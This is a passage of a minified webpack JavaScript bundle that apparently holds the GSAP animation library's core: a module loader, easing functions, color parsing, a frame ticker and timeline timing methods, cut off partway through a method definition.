!(function (t) {
  var e = {};
  function r(i) {
    if (e[i]) return e[i].exports;
    var n = (e[i] = { i: i, l: !1, exports: {} });
    return t[i].call(n.exports, n, n.exports, r), (n.l = !0), n.exports;
  }
  (r.m = t),
    (r.c = e),
    (r.d = function (t, e, i) {
      r.o(t, e) || Object.defineProperty(t, e, { enumerable: !0, get: i });
    }),
    (r.r = function (t) {
      "undefined" != typeof Symbol &&
        Symbol.toStringTag &&
        Object.defineProperty(t, Symbol.toStringTag, { value: "Module" }),
        Object.defineProperty(t, "__esModule", { value: !0 });
    }),
    (r.t = function (t, e) {
      if ((1 & e && (t = r(t)), 8 & e)) return t;
      if (4 & e && "object" == typeof t && t && t.__esModule) return t;
      var i = Object.create(null);
      if (
        (r.r(i),
        Object.defineProperty(i, "default", { enumerable: !0, value: t }),
        2 & e && "string" != typeof t)
      )
        for (var n in t)
          r.d(
            i,
            n,
            function (e) {
              return t[e];
            }.bind(null, n)
          );
      return i;
    }),
    (r.n = function (t) {
      var e =
        t && t.__esModule
          ? function () {
              return t.default;
            }
          : function () {
              return t;
            };
      return r.d(e, "a", e), e;
    }),
    (r.o = function (t, e) {
      return Object.prototype.hasOwnProperty.call(t, e);
    }),
    (r.p = "/assets/"),
    r((r.s = 81));
})([
  function (t, e, r) {
    !(function (t) {
      "use strict";
      function e(t, e) {
        (t.prototype = Object.create(e.prototype)),
          (t.prototype.constructor = t),
          (t.__proto__ = e);
      }
      function r(t) {
        if (void 0 === t)
          throw new ReferenceError(
            "this hasn't been initialised - super() hasn't been called"
          );
        return t;
      }
      var i,
        n,
        s,
        o,
        a,
        l,
        h,
        u,
        c,
        d,
        p,
        f,
        g,
        m,
        _,
        v,
        y,
        D,
        x,
        b,
        w,
        T,
        S,
        E,
        C,
        P,
        F,
        M = {
          autoSleep: 120,
          force3D: "auto",
          nullTargetWarn: 1,
          units: { lineHeight: "" },
        },
        R = { duration: 0.5, overwrite: !1, delay: 0 },
        A = 1e8,
        O = 2 * Math.PI,
        k = O / 4,
        L = 0,
        B = Math.sqrt,
        z = Math.cos,
        I = Math.sin,
        j = function (t) {
          return "string" == typeof t;
        },
        V = function (t) {
          return "function" == typeof t;
        },
        N = function (t) {
          return "number" == typeof t;
        },
        U = function (t) {
          return void 0 === t;
        },
        W = function (t) {
          return "object" == typeof t;
        },
        H = function (t) {
          return !1 !== t;
        },
        q = function () {
          return "undefined" != typeof window;
        },
        X = function (t) {
          return V(t) || j(t);
        },
        Y =
          ("function" == typeof ArrayBuffer && ArrayBuffer.isView) ||
          function () {},
        G = Array.isArray,
        K = /(?:-?\.?\d|\.)+/gi,
        Q = /[-+=.]*\d+[.e\-+]*\d*[e\-\+]*\d*/g,
        Z = /[-+=.]*\d+[.e-]*\d*[a-z%]*/g,
        $ = /[-+=.]*\d+(?:\.|e-|e)*\d*/gi,
        J = /[+-]=-?[\.\d]+/,
        tt = /[#\-+.]*\b[a-z\d-=+%.]+/gi,
        et = {},
        rt = {},
        it = function (t) {
          return (rt = Ft(t, et)) && cr;
        },
        nt = function (t, e) {
          return console.warn(
            "Invalid property",
            t,
            "set to",
            e,
            "Missing plugin? gsap.registerPlugin()"
          );
        },
        st = function (t, e) {
          return !e && console.warn(t);
        },
        ot = function (t, e) {
          return (t && (et[t] = e) && rt && (rt[t] = e)) || et;
        },
        at = function () {
          return 0;
        },
        lt = {},
        ht = [],
        ut = {},
        ct = {},
        dt = {},
        pt = 30,
        ft = [],
        gt = "",
        mt = function (t) {
          var e,
            r,
            i = t[0];
          if ((W(i) || V(i) || (t = [t]), !(e = (i._gsap || {}).harness))) {
            for (r = ft.length; r-- && !ft[r].targetTest(i); );
            e = ft[r];
          }
          for (r = t.length; r--; )
            (t[r] && (t[r]._gsap || (t[r]._gsap = new Be(t[r], e)))) ||
              t.splice(r, 1);
          return t;
        },
        _t = function (t) {
          return t._gsap || mt(re(t))[0]._gsap;
        },
        vt = function (t, e, r) {
          return (r = t[e]) && V(r)
            ? t[e]()
            : (U(r) && t.getAttribute && t.getAttribute(e)) || r;
        },
        yt = function (t, e) {
          return (t = t.split(",")).forEach(e) || t;
        },
        Dt = function (t) {
          return Math.round(1e5 * t) / 1e5 || 0;
        },
        xt = function (t, e) {
          for (var r = e.length, i = 0; t.indexOf(e[i]) < 0 && ++i < r; );
          return i < r;
        },
        bt = function (t, e, r) {
          var i,
            n = N(t[1]),
            s = (n ? 2 : 1) + (e < 2 ? 0 : 1),
            o = t[s];
          if ((n && (o.duration = t[1]), (o.parent = r), e)) {
            for (i = o; r && !("immediateRender" in i); )
              (i = r.vars.defaults || {}), (r = H(r.vars.inherit) && r.parent);
            (o.immediateRender = H(i.immediateRender)),
              e < 2 ? (o.runBackwards = 1) : (o.startAt = t[s - 1]);
          }
          return o;
        },
        wt = function () {
          var t,
            e,
            r = ht.length,
            i = ht.slice(0);
          for (ut = {}, ht.length = 0, t = 0; t < r; t++)
            (e = i[t]) &&
              e._lazy &&
              (e.render(e._lazy[0], e._lazy[1], !0)._lazy = 0);
        },
        Tt = function (t, e, r, i) {
          ht.length && wt(), t.render(e, r, i), ht.length && wt();
        },
        St = function (t) {
          var e = parseFloat(t);
          return (e || 0 === e) && (t + "").match(tt).length < 2
            ? e
            : j(t)
            ? t.trim()
            : t;
        },
        Et = function (t) {
          return t;
        },
        Ct = function (t, e) {
          for (var r in e) r in t || (t[r] = e[r]);
          return t;
        },
        Pt = function (t, e) {
          for (var r in e)
            r in t || "duration" === r || "ease" === r || (t[r] = e[r]);
        },
        Ft = function (t, e) {
          for (var r in e) t[r] = e[r];
          return t;
        },
        Mt = function t(e, r) {
          for (var i in r) e[i] = W(r[i]) ? t(e[i] || (e[i] = {}), r[i]) : r[i];
          return e;
        },
        Rt = function (t, e) {
          var r,
            i = {};
          for (r in t) r in e || (i[r] = t[r]);
          return i;
        },
        At = function (t) {
          var e = t.parent || i,
            r = t.keyframes ? Pt : Ct;
          if (H(t.inherit))
            for (; e; ) r(t, e.vars.defaults), (e = e.parent || e._dp);
          return t;
        },
        Ot = function (t, e, r, i) {
          void 0 === r && (r = "_first"), void 0 === i && (i = "_last");
          var n = e._prev,
            s = e._next;
          n ? (n._next = s) : t[r] === e && (t[r] = s),
            s ? (s._prev = n) : t[i] === e && (t[i] = n),
            (e._next = e._prev = e.parent = null);
        },
        kt = function (t, e) {
          t.parent && (!e || t.parent.autoRemoveChildren) && t.parent.remove(t),
            (t._act = 0);
        },
        Lt = function (t, e) {
          if (t && (!e || e._end > t._dur || e._start < 0))
            for (var r = t; r; ) (r._dirty = 1), (r = r.parent);
          return t;
        },
        zt = function (t) {
          return t._repeat
            ? It(t._tTime, (t = t.duration() + t._rDelay)) * t
            : 0;
        },
        It = function (t, e) {
          return (t /= e) && ~~t === t ? ~~t - 1 : ~~t;
        },
        jt = function (t, e) {
          return (
            (t - e._start) * e._ts +
            (e._ts >= 0 ? 0 : e._dirty ? e.totalDuration() : e._tDur)
          );
        },
        Vt = function (t) {
          return (t._end = Dt(
            t._start + (t._tDur / Math.abs(t._ts || t._rts || 1e-8) || 0)
          ));
        },
        Nt = function (t, e) {
          var r = t._dp;
          return (
            r &&
              r.smoothChildTiming &&
              t._ts &&
              ((t._start = Dt(
                t._dp._time -
                  (t._ts > 0
                    ? e / t._ts
                    : ((t._dirty ? t.totalDuration() : t._tDur) - e) / -t._ts)
              )),
              Vt(t),
              r._dirty || Lt(r, t)),
            t
          );
        },
        Ut = function (t, e) {
          var r;
          if (
            ((e._time || (e._initted && !e._dur)) &&
              ((r = jt(t.rawTime(), e)),
              (!e._dur || Zt(0, e.totalDuration(), r) - e._tTime > 1e-8) &&
                e.render(r, !0)),
            Lt(t, e)._dp && t._initted && t._time >= t._dur && t._ts)
          ) {
            if (t._dur < t.duration())
              for (r = t; r._dp; )
                r.rawTime() >= 0 && r.totalTime(r._tTime), (r = r._dp);
            t._zTime = -1e-8;
          }
        },
        Wt = function (t, e, r, i) {
          return (
            e.parent && kt(e),
            (e._start = Dt(r + e._delay)),
            (e._end = Dt(
              e._start + (e.totalDuration() / Math.abs(e.timeScale()) || 0)
            )),
            (function (t, e, r, i, n) {
              void 0 === r && (r = "_first"), void 0 === i && (i = "_last");
              var s,
                o = t[i];
              if (n) for (s = e[n]; o && o[n] > s; ) o = o._prev;
              o
                ? ((e._next = o._next), (o._next = e))
                : ((e._next = t[r]), (t[r] = e)),
                e._next ? (e._next._prev = e) : (t[i] = e),
                (e._prev = o),
                (e.parent = e._dp = t);
            })(t, e, "_first", "_last", t._sort ? "_start" : 0),
            (t._recent = e),
            i || Ut(t, e),
            t
          );
        },
        Ht = function (t, e) {
          return (
            (et.ScrollTrigger || nt("scrollTrigger", e)) &&
            et.ScrollTrigger.create(e, t)
          );
        },
        qt = function (t, e, r, i) {
          return (
            We(t, e),
            t._initted
              ? !r &&
                t._pt &&
                ((t._dur && !1 !== t.vars.lazy) || (!t._dur && t.vars.lazy)) &&
                l !== we.frame
                ? (ht.push(t), (t._lazy = [e, i]), 1)
                : void 0
              : 1
          );
        },
        Xt = function (t, e, r, i) {
          var n = t._repeat,
            s = Dt(e) || 0,
            o = t._tTime / t._tDur;
          return (
            o && !i && (t._time *= s / t._dur),
            (t._dur = s),
            (t._tDur = n
              ? n < 0
                ? 1e10
                : Dt(s * (n + 1) + t._rDelay * n)
              : s),
            o && !i ? Nt(t, (t._tTime = t._tDur * o)) : t.parent && Vt(t),
            r || Lt(t.parent, t),
            t
          );
        },
        Yt = function (t) {
          return t instanceof Ie ? Lt(t) : Xt(t, t._dur);
        },
        Gt = { _start: 0, endTime: at },
        Kt = function t(e, r) {
          var i,
            n,
            s = e.labels,
            o = e._recent || Gt,
            a = e.duration() >= A ? o.endTime(!1) : e._dur;
          return j(r) && (isNaN(r) || r in s)
            ? "<" === (i = r.charAt(0)) || ">" === i
              ? ("<" === i ? o._start : o.endTime(o._repeat >= 0)) +
                (parseFloat(r.substr(1)) || 0)
              : (i = r.indexOf("=")) < 0
              ? (r in s || (s[r] = a), s[r])
              : ((n = +(r.charAt(i - 1) + r.substr(i + 1))),
                i > 1 ? t(e, r.substr(0, i - 1)) + n : a + n)
            : null == r
            ? a
            : +r;
        },
        Qt = function (t, e) {
          return t || 0 === t ? e(t) : e;
        },
        Zt = function (t, e, r) {
          return r < t ? t : r > e ? e : r;
        },
        $t = function (t) {
          return (t = (t + "").substr((parseFloat(t) + "").length)) && isNaN(t)
            ? t
            : "";
        },
        Jt = [].slice,
        te = function (t, e) {
          return (
            t &&
            W(t) &&
            "length" in t &&
            ((!e && !t.length) || (t.length - 1 in t && W(t[0]))) &&
            !t.nodeType &&
            t !== n
          );
        },
        re = function (t, e) {
          return !j(t) || e || (!s && Te())
            ? G(t)
              ? (function (t, e, r) {
                  return (
                    void 0 === r && (r = []),
                    t.forEach(function (t) {
                      var i;
                      return (j(t) && !e) || te(t, 1)
                        ? (i = r).push.apply(i, re(t))
                        : r.push(t);
                    }) || r
                  );
                })(t, e)
              : te(t)
              ? Jt.call(t, 0)
              : t
              ? [t]
              : []
            : Jt.call(o.querySelectorAll(t), 0);
        },
        ie = function (t) {
          return t.sort(function () {
            return 0.5 - Math.random();
          });
        },
        ne = function (t) {
          if (V(t)) return t;
          var e = W(t) ? t : { each: t },
            r = Re(e.ease),
            i = e.from || 0,
            n = parseFloat(e.base) || 0,
            s = {},
            o = i > 0 && i < 1,
            a = isNaN(i) || o,
            l = e.axis,
            h = i,
            u = i;
          return (
            j(i)
              ? (h = u = { center: 0.5, edges: 0.5, end: 1 }[i] || 0)
              : !o && a && ((h = i[0]), (u = i[1])),
            function (t, o, c) {
              var d,
                p,
                f,
                g,
                m,
                _,
                v,
                y,
                D,
                x = (c || e).length,
                b = s[x];
              if (!b) {
                if (!(D = "auto" === e.grid ? 0 : (e.grid || [1, A])[1])) {
                  for (
                    v = -A;
                    v < (v = c[D++].getBoundingClientRect().left) && D < x;

                  );
                  D--;
                }
                for (
                  b = s[x] = [],
                    d = a ? Math.min(D, x) * h - 0.5 : i % D,
                    p = a ? (x * u) / D - 0.5 : (i / D) | 0,
                    v = 0,
                    y = A,
                    _ = 0;
                  _ < x;
                  _++
                )
                  (f = (_ % D) - d),
                    (g = p - ((_ / D) | 0)),
                    (b[_] = m =
                      l ? Math.abs("y" === l ? g : f) : B(f * f + g * g)),
                    m > v && (v = m),
                    m < y && (y = m);
                "random" === i && ie(b),
                  (b.max = v - y),
                  (b.min = y),
                  (b.v = x =
                    (parseFloat(e.amount) ||
                      parseFloat(e.each) *
                        (D > x
                          ? x - 1
                          : l
                          ? "y" === l
                            ? x / D
                            : D
                          : Math.max(D, x / D)) ||
                      0) * ("edges" === i ? -1 : 1)),
                  (b.b = x < 0 ? n - x : n),
                  (b.u = $t(e.amount || e.each) || 0),
                  (r = r && x < 0 ? Fe(r) : r);
              }
              return (
                (x = (b[t] - b.min) / b.max || 0),
                Dt(b.b + (r ? r(x) : x) * b.v) + b.u
              );
            }
          );
        },
        se = function (t) {
          var e = t < 1 ? Math.pow(10, (t + "").length - 2) : 1;
          return function (r) {
            return (
              Math.floor(Math.round(parseFloat(r) / t) * t * e) / e +
              (N(r) ? 0 : $t(r))
            );
          };
        },
        oe = function (t, e) {
          var r,
            i,
            n = G(t);
          return (
            !n &&
              W(t) &&
              ((r = n = t.radius || A),
              t.values
                ? ((t = re(t.values)), (i = !N(t[0])) && (r *= r))
                : (t = se(t.increment))),
            Qt(
              e,
              n
                ? V(t)
                  ? function (e) {
                      return (i = t(e)), Math.abs(i - e) <= r ? i : e;
                    }
                  : function (e) {
                      for (
                        var n,
                          s,
                          o = parseFloat(i ? e.x : e),
                          a = parseFloat(i ? e.y : 0),
                          l = A,
                          h = 0,
                          u = t.length;
                        u--;

                      )
                        (n = i
                          ? (n = t[u].x - o) * n + (s = t[u].y - a) * s
                          : Math.abs(t[u] - o)) < l && ((l = n), (h = u));
                      return (
                        (h = !r || l <= r ? t[h] : e),
                        i || h === e || N(e) ? h : h + $t(e)
                      );
                    }
                : se(t)
            )
          );
        },
        ae = function (t, e, r, i) {
          return Qt(G(t) ? !e : !0 === r ? !!(r = 0) : !i, function () {
            return G(t)
              ? t[~~(Math.random() * t.length)]
              : (r = r || 1e-5) &&
                  (i = r < 1 ? Math.pow(10, (r + "").length - 2) : 1) &&
                  Math.floor(
                    Math.round((t + Math.random() * (e - t)) / r) * r * i
                  ) / i;
          });
        },
        le = function (t, e, r) {
          return Qt(r, function (r) {
            return t[~~e(r)];
          });
        },
        he = function (t) {
          for (var e, r, i, n, s = 0, o = ""; ~(e = t.indexOf("random(", s)); )
            (i = t.indexOf(")", e)),
              (n = "[" === t.charAt(e + 7)),
              (r = t.substr(e + 7, i - e - 7).match(n ? tt : K)),
              (o +=
                t.substr(s, e - s) +
                ae(n ? r : +r[0], n ? 0 : +r[1], +r[2] || 1e-5)),
              (s = i + 1);
          return o + t.substr(s, t.length - s);
        },
        ue = function (t, e, r, i, n) {
          var s = e - t,
            o = i - r;
          return Qt(n, function (e) {
            return r + (((e - t) / s) * o || 0);
          });
        },
        ce = function (t, e, r) {
          var i,
            n,
            s,
            o = t.labels,
            a = A;
          for (i in o)
            (n = o[i] - e) < 0 == !!r &&
              n &&
              a > (n = Math.abs(n)) &&
              ((s = i), (a = n));
          return s;
        },
        de = function (t, e, r) {
          var i,
            n,
            s = t.vars,
            o = s[e];
          if (o)
            return (
              (i = s[e + "Params"]),
              (n = s.callbackScope || t),
              r && ht.length && wt(),
              i ? o.apply(n, i) : o.call(n)
            );
        },
        pe = function (t) {
          return kt(t), t.progress() < 1 && de(t, "onInterrupt"), t;
        },
        ge = {
          aqua: [0, 255, 255],
          lime: [0, 255, 0],
          silver: [192, 192, 192],
          black: [0, 0, 0],
          maroon: [128, 0, 0],
          teal: [0, 128, 128],
          blue: [0, 0, 255],
          navy: [0, 0, 128],
          white: [255, 255, 255],
          olive: [128, 128, 0],
          yellow: [255, 255, 0],
          orange: [255, 165, 0],
          gray: [128, 128, 128],
          purple: [128, 0, 128],
          green: [0, 128, 0],
          red: [255, 0, 0],
          pink: [255, 192, 203],
          cyan: [0, 255, 255],
          transparent: [255, 255, 255, 0],
        },
        me = function (t, e, r) {
          return (
            (255 *
              (6 * (t = t < 0 ? t + 1 : t > 1 ? t - 1 : t) < 1
                ? e + (r - e) * t * 6
                : t < 0.5
                ? r
                : 3 * t < 2
                ? e + (r - e) * (2 / 3 - t) * 6
                : e) +
              0.5) |
            0
          );
        },
        _e = function (t, e, r) {
          var i,
            n,
            s,
            o,
            a,
            l,
            h,
            u,
            c,
            d,
            p = t ? (N(t) ? [t >> 16, (t >> 8) & 255, 255 & t] : 0) : ge.black;
          if (!p) {
            if (
              ("," === t.substr(-1) && (t = t.substr(0, t.length - 1)), ge[t])
            )
              p = ge[t];
            else if ("#" === t.charAt(0))
              4 === t.length &&
                ((i = t.charAt(1)),
                (n = t.charAt(2)),
                (s = t.charAt(3)),
                (t = "#" + i + i + n + n + s + s)),
                (p = [
                  (t = parseInt(t.substr(1), 16)) >> 16,
                  (t >> 8) & 255,
                  255 & t,
                ]);
            else if ("hsl" === t.substr(0, 3))
              if (((p = d = t.match(K)), e)) {
                if (~t.indexOf("="))
                  return (p = t.match(Q)), r && p.length < 4 && (p[3] = 1), p;
              } else
                (o = (+p[0] % 360) / 360),
                  (a = +p[1] / 100),
                  (i =
                    2 * (l = +p[2] / 100) -
                    (n = l <= 0.5 ? l * (a + 1) : l + a - l * a)),
                  p.length > 3 && (p[3] *= 1),
                  (p[0] = me(o + 1 / 3, i, n)),
                  (p[1] = me(o, i, n)),
                  (p[2] = me(o - 1 / 3, i, n));
            else p = t.match(K) || ge.transparent;
            p = p.map(Number);
          }
          return (
            e &&
              !d &&
              ((i = p[0] / 255),
              (n = p[1] / 255),
              (s = p[2] / 255),
              (l = ((h = Math.max(i, n, s)) + (u = Math.min(i, n, s))) / 2),
              h === u
                ? (o = a = 0)
                : ((c = h - u),
                  (a = l > 0.5 ? c / (2 - h - u) : c / (h + u)),
                  (o =
                    h === i
                      ? (n - s) / c + (n < s ? 6 : 0)
                      : h === n
                      ? (s - i) / c + 2
                      : (i - n) / c + 4),
                  (o *= 60)),
              (p[0] = ~~(o + 0.5)),
              (p[1] = ~~(100 * a + 0.5)),
              (p[2] = ~~(100 * l + 0.5))),
            r && p.length < 4 && (p[3] = 1),
            p
          );
        },
        ve = function (t) {
          var e = [],
            r = [],
            i = -1;
          return (
            t.split(De).forEach(function (t) {
              var n = t.match(Z) || [];
              e.push.apply(e, n), r.push((i += n.length + 1));
            }),
            (e.c = r),
            e
          );
        },
        ye = function (t, e, r) {
          var i,
            n,
            s,
            o,
            a = "",
            l = (t + a).match(De),
            h = e ? "hsla(" : "rgba(",
            u = 0;
          if (!l) return t;
          if (
            ((l = l.map(function (t) {
              return (
                (t = _e(t, e, 1)) &&
                h +
                  (e
                    ? t[0] + "," + t[1] + "%," + t[2] + "%," + t[3]
                    : t.join(",")) +
                  ")"
              );
            })),
            r && ((s = ve(t)), (i = r.c).join(a) !== s.c.join(a)))
          )
            for (o = (n = t.replace(De, "1").split(Z)).length - 1; u < o; u++)
              a +=
                n[u] +
                (~i.indexOf(u)
                  ? l.shift() || h + "0,0,0,0)"
                  : (s.length ? s : l.length ? l : r).shift());
          if (!n)
            for (o = (n = t.split(De)).length - 1; u < o; u++) a += n[u] + l[u];
          return a + n[o];
        },
        De = (function () {
          var t,
            e =
              "(?:\\b(?:(?:rgb|rgba|hsl|hsla)\\(.+?\\))|\\B#(?:[0-9a-f]{3}){1,2}\\b";
          for (t in ge) e += "|" + t + "\\b";
          return new RegExp(e + ")", "gi");
        })(),
        xe = /hsl[a]?\(/,
        be = function (t) {
          var e,
            r = t.join(" ");
          if (((De.lastIndex = 0), De.test(r)))
            return (
              (e = xe.test(r)),
              (t[1] = ye(t[1], e)),
              (t[0] = ye(t[0], e, ve(t[1]))),
              !0
            );
        },
        we =
          ((_ = Date.now),
          (v = 500),
          (y = 33),
          (D = _()),
          (x = D),
          (w = b = 1e3 / 240),
          (S = function t(e) {
            var r,
              i,
              n,
              s,
              o = _() - x,
              a = !0 === e;
            if (
              (o > v && (D += o - y),
              ((r = (n = (x += o) - D) - w) > 0 || a) &&
                ((s = ++f.frame),
                (g = n - 1e3 * f.time),
                (f.time = n /= 1e3),
                (w += r + (r >= b ? 4 : b - r)),
                (i = 1)),
              a || (c = d(t)),
              i)
            )
              for (m = 0; m < T.length; m++) T[m](n, g, s, e);
          }),
          (f = {
            time: 0,
            frame: 0,
            tick: function () {
              S(!0);
            },
            deltaRatio: function (t) {
              return g / (1e3 / (t || 60));
            },
            wake: function () {
              a &&
                (!s &&
                  q() &&
                  ((n = s = window),
                  (o = n.document || {}),
                  (et.gsap = cr),
                  (n.gsapVersions || (n.gsapVersions = [])).push(cr.version),
                  it(rt || n.GreenSockGlobals || (!n.gsap && n) || {}),
                  (p = n.requestAnimationFrame)),
                c && f.sleep(),
                (d =
                  p ||
                  function (t) {
                    return setTimeout(t, (w - 1e3 * f.time + 1) | 0);
                  }),
                (u = 1),
                S(2));
            },
            sleep: function () {
              (p ? n.cancelAnimationFrame : clearTimeout)(c), (u = 0), (d = at);
            },
            lagSmoothing: function (t, e) {
              (v = t || 1 / 1e-8), (y = Math.min(e, v, 0));
            },
            fps: function (t) {
              (b = 1e3 / (t || 240)), (w = 1e3 * f.time + b);
            },
            add: function (t) {
              T.indexOf(t) < 0 && T.push(t), Te();
            },
            remove: function (t) {
              var e;
              ~(e = T.indexOf(t)) && T.splice(e, 1) && m >= e && m--;
            },
            _listeners: (T = []),
          })),
        Te = function () {
          return !u && we.wake();
        },
        Se = {},
        Ee = /^[\d.\-M][\d.\-,\s]/,
        Ce = /["']/g,
        Pe = function (t) {
          for (
            var e,
              r,
              i,
              n = {},
              s = t.substr(1, t.length - 3).split(":"),
              o = s[0],
              a = 1,
              l = s.length;
            a < l;
            a++
          )
            (r = s[a]),
              (e = a !== l - 1 ? r.lastIndexOf(",") : r.length),
              (i = r.substr(0, e)),
              (n[o] = isNaN(i) ? i.replace(Ce, "").trim() : +i),
              (o = r.substr(e + 1).trim());
          return n;
        },
        Fe = function (t) {
          return function (e) {
            return 1 - t(1 - e);
          };
        },
        Me = function t(e, r) {
          for (var i, n = e._first; n; )
            n instanceof Ie
              ? t(n, r)
              : !n.vars.yoyoEase ||
                (n._yoyo && n._repeat) ||
                n._yoyo === r ||
                (n.timeline
                  ? t(n.timeline, r)
                  : ((i = n._ease),
                    (n._ease = n._yEase),
                    (n._yEase = i),
                    (n._yoyo = r))),
              (n = n._next);
        },
        Re = function (t, e) {
          return (
            (t &&
              (V(t)
                ? t
                : Se[t] ||
                  (function (t) {
                    var e,
                      r,
                      i,
                      n,
                      s = (t + "").split("("),
                      o = Se[s[0]];
                    return o && s.length > 1 && o.config
                      ? o.config.apply(
                          null,
                          ~t.indexOf("{")
                            ? [Pe(s[1])]
                            : ((e = t),
                              (r = e.indexOf("(") + 1),
                              (i = e.indexOf(")")),
                              (n = e.indexOf("(", r)),
                              e.substring(
                                r,
                                ~n && n < i ? e.indexOf(")", i + 1) : i
                              ))
                                .split(",")
                                .map(St)
                        )
                      : Se._CE && Ee.test(t)
                      ? Se._CE("", t)
                      : o;
                  })(t))) ||
            e
          );
        },
        Ae = function (t, e, r, i) {
          void 0 === r &&
            (r = function (t) {
              return 1 - e(1 - t);
            }),
            void 0 === i &&
              (i = function (t) {
                return t < 0.5 ? e(2 * t) / 2 : 1 - e(2 * (1 - t)) / 2;
              });
          var n,
            s = { easeIn: e, easeOut: r, easeInOut: i };
          return (
            yt(t, function (t) {
              for (var e in ((Se[t] = et[t] = s),
              (Se[(n = t.toLowerCase())] = r),
              s))
                Se[
                  n +
                    ("easeIn" === e
                      ? ".in"
                      : "easeOut" === e
                      ? ".out"
                      : ".inOut")
                ] = Se[t + "." + e] = s[e];
            }),
            s
          );
        },
        Oe = function (t) {
          return function (e) {
            return e < 0.5
              ? (1 - t(1 - 2 * e)) / 2
              : 0.5 + t(2 * (e - 0.5)) / 2;
          };
        },
        ke = function t(e, r, i) {
          var n = r >= 1 ? r : 1,
            s = (i || (e ? 0.3 : 0.45)) / (r < 1 ? r : 1),
            o = (s / O) * (Math.asin(1 / n) || 0),
            a = function (t) {
              return 1 === t
                ? 1
                : n * Math.pow(2, -10 * t) * I((t - o) * s) + 1;
            },
            l =
              "out" === e
                ? a
                : "in" === e
                ? function (t) {
                    return 1 - a(1 - t);
                  }
                : Oe(a);
          return (
            (s = O / s),
            (l.config = function (r, i) {
              return t(e, r, i);
            }),
            l
          );
        },
        Le = function t(e, r) {
          void 0 === r && (r = 1.70158);
          var i = function (t) {
              return t ? --t * t * ((r + 1) * t + r) + 1 : 0;
            },
            n =
              "out" === e
                ? i
                : "in" === e
                ? function (t) {
                    return 1 - i(1 - t);
                  }
                : Oe(i);
          return (
            (n.config = function (r) {
              return t(e, r);
            }),
            n
          );
        };
      yt("Linear,Quad,Cubic,Quart,Quint,Strong", function (t, e) {
        var r = e < 5 ? e + 1 : e;
        Ae(
          t + ",Power" + (r - 1),
          e
            ? function (t) {
                return Math.pow(t, r);
              }
            : function (t) {
                return t;
              },
          function (t) {
            return 1 - Math.pow(1 - t, r);
          },
          function (t) {
            return t < 0.5
              ? Math.pow(2 * t, r) / 2
              : 1 - Math.pow(2 * (1 - t), r) / 2;
          }
        );
      }),
        (Se.Linear.easeNone = Se.none = Se.Linear.easeIn),
        Ae("Elastic", ke("in"), ke("out"), ke()),
        (E = 7.5625),
        (P = 1 / (C = 2.75)),
        Ae(
          "Bounce",
          function (t) {
            return 1 - F(1 - t);
          },
          (F = function (t) {
            return t < P
              ? E * t * t
              : t < 0.7272727272727273
              ? E * Math.pow(t - 1.5 / C, 2) + 0.75
              : t < 0.9090909090909092
              ? E * (t -= 2.25 / C) * t + 0.9375
              : E * Math.pow(t - 2.625 / C, 2) + 0.984375;
          })
        ),
        Ae("Expo", function (t) {
          return t ? Math.pow(2, 10 * (t - 1)) : 0;
        }),
        Ae("Circ", function (t) {
          return -(B(1 - t * t) - 1);
        }),
        Ae("Sine", function (t) {
          return 1 === t ? 1 : 1 - z(t * k);
        }),
        Ae("Back", Le("in"), Le("out"), Le()),
        (Se.SteppedEase =
          Se.steps =
          et.SteppedEase =
            {
              config: function (t, e) {
                void 0 === t && (t = 1);
                var r = 1 / t,
                  i = t + (e ? 0 : 1),
                  n = e ? 1 : 0;
                return function (t) {
                  return (((i * Zt(0, 1 - 1e-8, t)) | 0) + n) * r;
                };
              },
            }),
        (R.ease = Se["quad.out"]),
        yt(
          "onComplete,onUpdate,onStart,onRepeat,onReverseComplete,onInterrupt",
          function (t) {
            return (gt += t + "," + t + "Params,");
          }
        );
      var Be = function (t, e) {
          (this.id = L++),
            (t._gsap = this),
            (this.target = t),
            (this.harness = e),
            (this.get = e ? e.get : vt),
            (this.set = e ? e.getSetter : $e);
        },
        ze = (function () {
          function t(t, e) {
            var r = t.parent || i;
            (this.vars = t),
              (this._delay = +t.delay || 0),
              (this._repeat = t.repeat || 0) &&
                ((this._rDelay = t.repeatDelay || 0),
                (this._yoyo = !!t.yoyo || !!t.yoyoEase)),
              (this._ts = 1),
              Xt(this, +t.duration, 1, 1),
              (this.data = t.data),
              u || we.wake(),
              r && Wt(r, this, e || 0 === e ? e : r._time, 1),
              t.reversed && this.reverse(),
              t.paused && this.paused(!0);
          }
          var e = t.prototype;
          return (
            (e.delay = function (t) {
              return t || 0 === t
                ? (this.parent &&
                    this.parent.smoothChildTiming &&
                    this.startTime(this._start + t - this._delay),
                  (this._delay = t),
                  this)
                : this._delay;
            }),
            (e.duration = function (t) {
              return arguments.length
                ? this.totalDuration(
                    this._repeat > 0 ? t + (t + this._rDelay) * this._repeat : t
                  )
                : this.totalDuration() && this._dur;
            }),
            (e.totalDuration = function (t) {
              return arguments.length
                ? ((this._dirty = 0),
                  Xt(
                    this,
                    this._repeat < 0
                      ? t
                      : (t - this._repeat * this._rDelay) / (this._repeat + 1)
                  ))
                : this._tDur;
            }),
            (e.totalTime = function (t, e) {
              if ((Te(), !arguments.length)) return this._tTime;
              var r = this._dp;
              if (r && r.smoothChildTiming && this._ts) {
                for (Nt(this, t); r.parent; )
                  r.parent._time !==
                    r._start +
                      (r._ts >= 0
                        ? r._tTime / r._ts
                        : (r.totalDuration() - r._tTime) / -r._ts) &&
                    r.totalTime(r._tTime, !0),
                    (r = r.parent);
                !this.parent &&
                  this._dp.autoRemoveChildren &&
                  ((this._ts > 0 && t < this._tDur) ||
                    (this._ts < 0 && t > 0) ||
                    (!this._tDur && !t)) &&
                  Wt(this._dp, this, this._start - this._delay);
              }
              return (
                (this._tTime !== t ||
                  (!this._dur && !e) ||
                  (this._initted && 1e-8 === Math.abs(this._zTime)) ||
                  (!t && !this._initted && (this.add || this._ptLookup))) &&
                  (this._ts || (this._pTime = t), Tt(this, t, e)),
                this
              );
            }),
            (e.time = function (t, e) {
              return arguments.length
                ? this.totalTime(
                    Math.min(this.totalDuration(), t + zt(this)) % this._dur ||
                      (t ? this._dur : 0),
                    e
                  )
                : this._time;
            }),
            (e.totalProgress = function (t, e) {
              return arguments.length
                ? this.totalTime(this.totalDuration() * t, e)
                : this.totalDuration()
                ? Math.min(1, this._tTime / this._tDur)
                : this.ratio;
            }),
            (e.progress = function (t, e) {
              return arguments.length
                ? this.totalTime(
                    this.duration() *
                      (!this._yoyo || 1 & this.iteration() ? t : 1 - t) +
                      zt(this),
                    e
                  )
                : this.duration()
                ? Math.min(1, this._time / this._dur)
                : this.ratio;
            }),
            (e.iteration = function (t, e) {
              var r = this.duration() + this._rDelay;
